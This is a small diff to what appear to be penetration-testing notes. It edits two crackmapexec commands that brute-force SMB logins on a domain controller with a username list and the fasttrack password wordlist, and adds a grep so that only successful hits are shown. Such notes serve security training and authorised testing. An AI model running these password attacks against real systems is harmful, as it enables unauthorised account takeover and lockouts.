@@ -2379,13 +2379,13 @@ Once we've identified the naming convention and gathered employee names or prepa
 Wordlist
 
 ```bash
-crackmapexec smb <DC IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt
+crackmapexec smb <DC IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt | grep "+"
 ```
 
 Username
 
 ```bash
-crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt
+crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+"
 ```
 
 **Option 2: netexec**
